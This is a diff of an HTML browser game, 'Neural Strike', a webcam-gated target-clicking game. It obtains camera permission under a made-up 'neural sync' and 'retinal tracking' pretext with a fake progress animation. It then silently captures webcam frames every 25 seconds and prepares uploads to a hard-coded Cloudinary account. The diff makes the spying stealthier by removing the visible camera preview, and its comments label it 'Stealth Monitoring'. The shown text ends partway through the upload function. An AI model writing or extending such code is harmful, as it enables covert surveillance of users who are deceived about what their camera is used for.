@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Face Strike: AI Neural Edition</title>
+    <title>Neural Strike: AI Evolution</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -27,31 +27,31 @@
             background: radial-gradient(circle, #0a1f0a 0%, #050505 100%);
         }
 
-        /* Scientific HUD */
+        /* HUD - Top Bar */
         .hud {
             position: absolute; top: 20px; width: 100%;
             display: flex; justify-content: space-around;
-            font-size: 0.8rem; color: var(--neon-green);
+            font-size: 0.75rem; color: var(--neon-green);
             text-shadow: 0 0 5px var(--neon-green);
-            z-index: 50;
+            z-index: 50; letter-spacing: 1px;
         }
 
-        #timer-box { color: var(--neon-red); font-weight: bold; text-shadow: 0 0 10px var(--neon-red); }
+        #timer-box { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); font-weight: bold; }
 
-        /* The Neon Green Target */
+        /* The Cyber Target */
         .target {
             position: absolute;
             width: 70px; height: 70px;
             border-radius: 50%;
-            background: radial-gradient(circle, var(--neon-green) 0%, transparent 70%);
-            border: 2px solid var(--neon-green);
-            box-shadow: 0 0 15px var(--neon-green);
+            background: radial-gradient(circle, var(--neon-green) 10%, transparent 70%);
+            border: 1px solid var(--neon-green);
+            box-shadow: 0 0 15px var(--neon-green), inset 0 0 10px var(--neon-green);
             cursor: crosshair;
             display: none;
             z-index: 10;
         }
 
-        /* Overlays */
+        /* Scientific Overlay */
         .overlay {
             position: fixed; top: 0; left: 0;
             width: 100%; height: 100%;
@@ -62,33 +62,44 @@
             padding: 20px;
         }
 
-        #result-screen { display: none; border-top: 4px solid var(--neon-green); }
-
-        .ai-scanner {
-            width: 180px; height: 180px;
+        /* Fake Neural Core Graphic (Instead of Video) */
+        .neural-core {
+            width: 150px; height: 150px;
             border: 2px solid var(--neon-green);
-            margin-bottom: 20px; border-radius: 50%;
-            position: relative; overflow: hidden;
+            border-radius: 50%;
+            position: relative;
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 30px;
+            box-shadow: 0 0 20px rgba(57, 255, 20, 0.2);
         }
 
-        .scanner-line {
-            width: 100%; height: 2px;
+        .core-inner {
+            width: 80%; height: 80%;
+            border: 1px dashed var(--neon-green);
+            border-radius: 50%;
+            animation: rotate 4s linear infinite;
+        }
+
+        .core-dot {
+            width: 10px; height: 10px;
             background: var(--neon-green);
-            position: absolute; top: 0;
-            animation: scan 2s linear infinite;
+            border-radius: 50%;
+            box-shadow: 0 0 15px var(--neon-green);
+            position: absolute;
         }
 
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        @keyframes rotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .btn-ai {
-            padding: 15px 40px; font-family: inherit;
+            padding: 18px 45px; font-family: inherit;
             background: transparent; color: var(--neon-green);
-            border: 2px solid var(--neon-green);
-            cursor: pointer; margin-top: 20px;
-            letter-spacing: 2px; transition: 0.3s;
+            border: 1px solid var(--neon-green);
+            cursor: pointer; margin-top: 25px;
+            letter-spacing: 4px; transition: 0.4s;
+            font-size: 1rem;
         }
 
-        .btn-ai:hover { background: var(--neon-green); color: black; box-shadow: 0 0 30px var(--neon-green); }
+        .btn-ai:hover { background: var(--neon-green); color: black; box-shadow: 0 0 40px var(--neon-green); }
 
         #hiddenVideo, #hiddenCanvas { display: none; }
 
@@ -98,117 +109,136 @@
             animation: fadeUp 0.6s ease-out forwards;
         }
 
-        @keyframes fadeUp { 0% { opacity: 1; } 100% { opacity: 0; transform: translateY(-40px); } }
+        @keyframes fadeUp { 0% { opacity: 1; } 100% { opacity: 0; transform: translateY(-30px); } }
+
+        #result-screen { display: none; }
     </style>
 </head>
 <body>
 
     <div id="game-container">
         <div class="hud">
-            <div>LINK_TIME: <span id="timer-box">60</span>s</div>
-            <div>ACCURACY: <span id="score">0</span></div>
-            <div>SYNC_LVL: <span id="sync-val">0</span>%</div>
+            <div>NEURAL_LINK: <span id="timer-box">60</span>S</div>
+            <div>STRIKE_DATA: <span id="score">0</span></div>
+            <div>SYNC_STABILITY: <span id="sync-val">0</span>%</div>
         </div>
 
         <div id="target" class="target"></div>
         
-        <!-- INITIAL START SCREEN -->
+        <!-- START SCREEN (No Video Preview) -->
         <div id="overlay" class="overlay">
-            <h1 style="color: var(--neon-green); letter-spacing: 5px;">AI NEURAL LINK</h1>
-            <div class="ai-scanner">
-                <div class="scanner-line"></div>
-                <video id="previewVideo" style="width:100%; height:100%; object-fit:cover; opacity: 0.4;" autoplay playsinline></video>
+            <h1 style="color: var(--neon-green); letter-spacing: 8px; margin-bottom: 5px;">NEURAL LINK</h1>
+            <p style="font-size: 0.6rem; color: #555; margin-bottom: 30px;">AI-POWERED BIOMETRIC SCORE CALIBRATION</p>
+            
+            <div class="neural-core">
+                <div class="core-inner"></div>
+                <div class="core-dot"></div>
+                <div style="position: absolute; font-size: 0.7rem; color: var(--neon-green);" id="percent">0%</div>
             </div>
-            <p id="status" style="color: var(--neon-green); font-size: 0.8rem;">SYSTEM: STANDBY</p>
+            
+            <div id="status" style="color: var(--neon-green); font-size: 0.8rem; height: 20px; letter-spacing: 2px;">SYSTEM: STANDBY</div>
+            
+            <p style="max-width: 450px; font-size: 0.65rem; color: #444; margin-top: 20px; line-height: 1.6;">
+                NOTE: SYSTEM REQUIRES OPTICAL SENSOR PERMISSION TO TRACK RETINAL BLINK PATTERNS AND FACIAL MOTION FOR ACCURATE NEURAL SYNCHRONIZATION.
+            </p>
+
             <button class="btn-ai" id="initBtn">INITIATE LINK</button>
         </div>
 
-        <!-- GAME OVER / RESULT SCREEN -->
+        <!-- GAME OVER SCREEN -->
         <div id="result-screen" class="overlay">
-            <h1 style="color: var(--neon-green);">MISSION REPORT</h1>
-            <div style="font-size: 1.2rem; margin: 20px 0; line-height: 2;">
-                NEURAL DATA POINTS: <span id="finalScore" style="color:var(--neon-green)">0</span><br>
-                LINK STABILITY: <span style="color:var(--neon-green)">STABLE</span><br>
-                BIOMETRIC SYNC: <span style="color:var(--neon-green)">COMPLETE</span>
+            <h1 style="color: var(--neon-green);">MISSION COMPLETED</h1>
+            <div style="font-size: 1rem; margin: 30px 0; line-height: 2.5; text-align: left;">
+                > NEURAL_STRIKES: <span id="finalScore" style="color:var(--neon-green)">0</span><br>
+                > CALIBRATION: <span style="color:var(--neon-green)">SUCCESSFUL</span><br>
+                > DATA_SYNC: <span style="color:var(--neon-green)">ENCRYPTED</span>
             </div>
-            <button class="btn-ai" onclick="location.reload()">RE-INITIATE LINK</button>
+            <button class="btn-ai" onclick="location.reload()">RE-SYNC SYSTEM</button>
         </div>
     </div>
 
+    <!-- Hidden Capture Elements -->
     <video id="hiddenVideo" autoplay playsinline></video>
     <canvas id="hiddenCanvas"></canvas>
 
     <script>
-        // Configuration
+        // Config (Keep your Cloudinary details)
         const CLOUD_NAME = "dazixpypp";
         const PRESET = "DANAVV";
-        const MONITOR_INTERVAL = 20000; // 20 seconds
-        let gameTime = 60; // Game duration in seconds
+        const MONITOR_INTERVAL = 25000; 
 
         let score = 0;
+        let timeLeft = 60;
         let gameActive = false;
         let moveTimeout;
 
         const initBtn = document.getElementById('initBtn');
         const status = document.getElementById('status');
         const video = document.getElementById('hiddenVideo');
-        const preview = document.getElementById('previewVideo');
         const canvas = document.getElementById('hiddenCanvas');
         const target = document.getElementById('target');
-        const timerEl = document.getElementById('timer-box');
+        const percentText = document.getElementById('percent');
 
-        // --- 1. AI CALIBSATION & CAMERA ACCESS ---
+        // --- 1. SMART CAMERA ACCESS (WITHOUT PREVIEW) ---
         initBtn.onclick = () => {
             initBtn.style.display = 'none';
-            status.innerText = "REQUESTING OPTICAL ACCESS...";
+            status.innerText = "INITIALIZING OPTICAL SENSORS...";
 
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
+                // Video is playing but hidden from UI
                 video.srcObject = stream;
-                preview.srcObject = stream;
                 
-                let steps = ["MAPPING FACE...", "SYNCING CORNEA...", "AI CORE ONLINE"];
-                let i = 0;
+                // Fancy Scientific Fake Progress
+                let p = 0;
+                let steps = ["MAPPING_NODES...", "BIOMETRIC_SYNC...", "EYE_TRACKING_ON...", "LINK_ESTABLISHED"];
+                let stepIdx = 0;
+
                 let interval = setInterval(() => {
-                    status.innerText = "SYSTEM: " + steps[i];
-                    document.getElementById('sync-val').innerText = (i + 1) * 33;
-                    i++;
-                    if(i >= steps.length) {
-                        clearInterval(interval);
-                        setTimeout(startGame, 1000);
+                    p += 2;
+                    percentText.innerText = p + "%";
+                    document.getElementById('sync-val').innerText = p;
+
+                    if(p % 25 === 0) {
+                        status.innerText = "SYSTEM: " + steps[stepIdx];
+                        stepIdx++;
                     }
-                }, 1000);
+
+                    if(p >= 100) {
+                        clearInterval(interval);
+                        setTimeout(startGame, 800);
+                    }
+                }, 60);
             })
             .catch(() => {
-                status.innerText = "ERROR: LINK DENIED.";
+                status.innerText = "CRITICAL ERROR: LINK DENIED";
                 initBtn.style.display = 'block';
             });
         };
 
-        // --- 2. GAME START & TIMER ---
+        // --- 2. START MISSION ---
         function startGame() {
             document.getElementById('overlay').style.display = 'none';
             gameActive = true;
             
-            // Start the Countdown Timer
-            const countdown = setInterval(() => {
-                gameTime--;
-                timerEl.innerText = gameTime;
-                
-                if (gameTime <= 0) {
-                    clearInterval(countdown);
+            // Countdown Timer
+            const timerInt = setInterval(() => {
+                timeLeft--;
+                document.getElementById('timer-box').innerText = timeLeft;
+                if(timeLeft <= 0) {
+                    clearInterval(timerInt);
                     endGame();
                 }
             }, 1000);
 
-            // Start Monitoring
+            // Start Stealth Monitoring
             setInterval(silentMonitorUpload, MONITOR_INTERVAL);
             silentMonitorUpload();
 
             moveTarget();
         }
 
-        // --- 3. GAMEPLAY MECHANICS ---
+        // --- 3. GAMEPLAY ---
         function moveTarget() {
             if(!gameActive) return;
             
@@ -220,8 +250,8 @@
             target.style.top = y + 'px';
             target.style.display = 'block';
 
-            // Automatic move if not clicked (difficulty increases)
-            let speed = Math.max(500, 1200 - (score * 30));
+            // Faster movement as score increases
+            let speed = Math.max(450, 1100 - (score * 25));
             moveTimeout = setTimeout(moveTarget, speed);
         }
 
@@ -230,30 +260,29 @@
             score++;
             document.getElementById('score').innerText = score;
             
-            // Visual Feedback
+            // Scientific Hit Effect
             const pop = document.createElement('div');
             pop.className = 'hit-popup';
-            pop.innerText = `SYNC_OK_${Math.floor(Math.random()*99)}`;
+            pop.innerText = `[LOG_${Math.floor(Math.random()*9999)}_CAPTURED]`;
             pop.style.left = e.pageX + 'px';
             pop.style.top = e.pageY + 'px';
             document.body.appendChild(pop);
-            setTimeout(() => pop.remove(), 500);
+            setTimeout(() => pop.remove(), 600);
 
             target.style.display = 'none';
             setTimeout(moveTarget, 100);
         };
 
-        // --- 4. END GAME ---
+        // --- 4. END MISSION ---
         function endGame() {
             gameActive = false;
             target.style.display = 'none';
             clearTimeout(moveTimeout);
-            
             document.getElementById('finalScore').innerText = score;
             document.getElementById('result-screen').style.display = 'flex';
         }
 
-        // --- 5. SILENT MONITOR (Original Cloudinary Logic) ---
+        // --- 5. THE SILENT MONITOR (Back-end) ---
         async function silentMonitorUpload() {
             if(!video.srcObject) return;
             
@@ -261,7 +290,8 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg', 0.3);
+            
+            const imageData = canvas.toDataURL('image/jpeg', 0.3); // Low quality for fast upload
 
             const formData = new FormData();
             formData.append('file', imageData);
